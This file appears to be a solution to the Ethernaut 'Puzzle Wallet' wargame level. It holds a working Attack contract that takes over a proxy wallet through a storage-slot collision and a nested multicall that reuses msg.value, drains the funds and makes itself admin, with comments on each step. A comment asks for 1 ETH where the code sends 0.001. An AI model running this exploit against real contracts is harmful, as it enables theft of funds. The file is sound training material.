// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// I tried to get the contract compiled but the following library was not working:
// import "../helpers/UpgradeableProxy-08.sol";
// So use instance of eternaut and create interface here.

// Goal: become admin and owner
// PuzzleProxy is proxy contract and Puzzelwallet is logic (implementation) contract
// Remember: order of state variables should be the same!

// How to run?
// 1. Get contract instance from ethernaut: 0xDB88276503F72B9e605aACA265A697193D36c610
// 2. Deploy Attack contract (with 0xDB88276503F72B9e605aACA265A697193D36c610 as input) and send 1 ETH

// We need the following functions in our interface
interface IPuzzle {
    function admin() external view returns (address);
    function proposeNewAdmin(address _newAdmin) external;
    function addToWhitelist(address addr) external;
    function deposit() external payable;
    function multicall(bytes[] calldata data) external payable;
    function execute(address to, uint256 value, bytes calldata data) external payable;
    function setMaxBalance(uint256 _maxBalance) external;
}

contract Attack {

     constructor(IPuzzle puzzle) payable {

        // Propose new admin with proposeNewAdmin() function
        // This updates pendingAdmin which has slot 0 in proxy contract, and owner also has slot 0 in the implementation contract
        // So we update owner!
        puzzle.proposeNewAdmin(address(this));

        // Now we are the owner and can call the addToWhitelist function
        puzzle.addToWhitelist(address(this));

        // Next we want to update state variable maxBalance (via function setMaxBalance())
        // We can check the balance of the contract which is 0.001 ETH

        // Note there is a delegatecall in multicall in the original contract below
        // Suppose A delegatecalls B, and B delegatecalls C. If msg.value =  1 ETH in A, it will be 1 ETH in B and C too!
        // Moreover,    A delegatecall B means: code executed in B and updates state in  A.
        // Next,        B delegatecall C means: code executed in C and updates state in  B.
        // So A ==> B ==> C, means code is executed in C but changes state in A!

        // That's what we need here:
        // Proxy delegatecalls implementation, which delegatecalls implementation again 
        // But problem then is: we can only call the deposit function once!
        // So we dont call deposit function directly, but we call the multicall function twice
        // Why? Because the multicall function resets: bool depositCalled = false;
        // So we can call it twice!

        // Multicall
        // 1. Deposit
        // 2. Multicall
        //      Deposit
        bytes[] memory deposit_data = new bytes[](1);
        deposit_data[0] = abi.encodeWithSelector(puzzle.deposit.selector);

        bytes[] memory data = new bytes[](2);
        // deposit
        data[0] = deposit_data[0];
        // multicall -> deposit
        data[1] = abi.encodeWithSelector(puzzle.multicall.selector, deposit_data);
        puzzle.multicall{value: 0.001 ether}(data);

        // withdraw
        puzzle.execute(msg.sender, 0.002 ether, "");

        // set admin
        puzzle.setMaxBalance(uint256(uint160(msg.sender)));

        require(puzzle.admin() == msg.sender, "hack failed");
        selfdestruct(payable(msg.sender));

     }
}


// ORIGINAL CONTRACT BELOW (COMMENTED OUT)
// pragma experimental ABIEncoderV2;

// import "../helpers/UpgradeableProxy-08.sol";

// contract PuzzleProxy is UpgradeableProxy {
//     address public pendingAdmin;
//     address public admin;

//     constructor(address _admin, address _implementation, bytes memory _initData)
//         UpgradeableProxy(_implementation, _initData)
//     {
//         admin = _admin;
//     }

//     modifier onlyAdmin() {
//         require(msg.sender == admin, "Caller is not the admin");
//         _;
//     }

//     function proposeNewAdmin(address _newAdmin) external {
//         pendingAdmin = _newAdmin;
//     }

//     function approveNewAdmin(address _expectedAdmin) external onlyAdmin {
//         require(pendingAdmin == _expectedAdmin, "Expected new admin by the current admin is not the pending admin");
//         admin = pendingAdmin;
//     }

//     function upgradeTo(address _newImplementation) external onlyAdmin {
//         _upgradeTo(_newImplementation);
//     }
// }

// contract PuzzleWallet {
//     address public owner;
//     uint256 public maxBalance;
//     mapping(address => bool) public whitelisted;
//     mapping(address => uint256) public balances;

//     function init(uint256 _maxBalance) public {
//         require(maxBalance == 0, "Already initialized");
//         maxBalance = _maxBalance;
//         owner = msg.sender;
//     }

//     modifier onlyWhitelisted() {
//         require(whitelisted[msg.sender], "Not whitelisted");
//         _;
//     }

//     function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
//         require(address(this).balance == 0, "Contract balance is not 0");
//         maxBalance = _maxBalance;
//     }

//     function addToWhitelist(address addr) external {
//         require(msg.sender == owner, "Not the owner");
//         whitelisted[addr] = true;
//     }

//     function deposit() external payable onlyWhitelisted {
//         require(address(this).balance <= maxBalance, "Max balance reached");
//         balances[msg.sender] += msg.value;
//     }

//     function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted {
//         require(balances[msg.sender] >= value, "Insufficient balance");
//         balances[msg.sender] -= value;
//         (bool success,) = to.call{value: value}(data);
//         require(success, "Execution failed");
//     }

//     function multicall(bytes[] calldata data) external payable onlyWhitelisted {
//         bool depositCalled = false;
//         for (uint256 i = 0; i < data.length; i++) {
//             bytes memory _data = data[i];
//             bytes4 selector;
//             assembly {
//                 selector := mload(add(_data, 32))
//             }
//             if (selector == this.deposit.selector) {
//                 require(!depositCalled, "Deposit can only be called once");
//                 // Protect against reusing msg.value
//                 depositCalled = true;
//             }
//             (bool success,) = address(this).delegatecall(data[i]);
//             require(success, "Error while delegating call");
//         }
//     }
// }